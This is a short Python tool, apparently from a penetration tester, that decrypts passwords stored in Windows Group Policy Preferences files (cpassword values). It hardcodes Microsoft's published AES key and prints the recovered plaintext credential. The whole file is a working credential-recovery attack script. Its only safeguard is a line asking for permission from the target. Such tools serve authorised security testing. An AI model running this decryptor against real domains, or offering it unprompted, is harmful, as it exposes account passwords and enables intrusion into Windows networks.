from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import argparse

# Shout out to https://github.com/reider-roque - This is a re-write of their gpprefdecrypt tool!

#pretty colors :)
RESET = "\033[0m"
RED   = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BOLD  = "\033[1m"

def getHash(file):
    print(f"{BOLD}{YELLOW}[*]{RESET} Getting hash from file")
    try:
        with open(file, 'r') as f:
            passwd = f.read().lstrip().rstrip()
    except FileNotFoundError:
        print(f"{BOLD}{RED}[-]{RESET} File not found!")
        raise SystemExit()
    except PermissionError:
        print(f"{BOLD}{RED}[-]{RESET} User does not have permission to read:", file)
        raise SystemExit()

    return passwd

def decodePasswd(passwd):
    print(f"{BOLD}{YELLOW}[*]{RESET} Decoding password")
    paddingLength = len(passwd)%4
    if paddingLength != 0:
        passwd  += '=' * (4 - paddingLength)
    decodedPasswd = b64decode(passwd)

    if len(decodedPasswd)%16 != 0:
        print(f"{BOLD}{RED}[-]{RESET} Decoded password does not meet AES block length, ensure you've provided a valid password!")
        raise SystemExit()
    
    return decodedPasswd

def decryptPasswd(passwd):
    print(f"{BOLD}{YELLOW}[*]{RESET} Decrypting password")
    #Key from http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
    key = bytes.fromhex("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")
    initVector = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

    decryptedBytes = AES.new(key, AES.MODE_CBC, initVector).decrypt(passwd)
    decryptedPasswd = unpad(decryptedBytes, AES.block_size).decode('utf-16')
    return decryptedPasswd


if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog='gpdecryptor.py',
                                     description='This util will decrypt passwords stored in Group Policy Password Encryption',
                                     epilog=f'Only use on with explicit permssion from the target.\nWritten by 0xVoodoo - Don\'t be a skid :)' )
    argGroup = parser.add_mutually_exclusive_group(required=True)
    argGroup.add_argument('-f', '--file', help='File containing the hash to crack')
    argGroup.add_argument('-p', '--password', help='Hash to crack')
    args = parser.parse_args()
    
    print(f"{BOLD}=={GREEN}Group Policy password decryptor by{RESET} {BOLD}{RED}0xVoodoo{RESET}{BOLD}=={RESET}")
    if args.password:
        passwd = args.password.lstrip().rstrip()
        decodedPasswd = decodePasswd(passwd)
    elif args.file:
        passwd = getHash(args.file)
        decodedPasswd = decodePasswd(passwd)
    
    decryptedPassword = decryptPasswd(decodedPasswd)
    print(f"{BOLD}{GREEN}[+]{RESET} Password decrypted: {BOLD}{RED}{decryptedPassword}{RESET}")
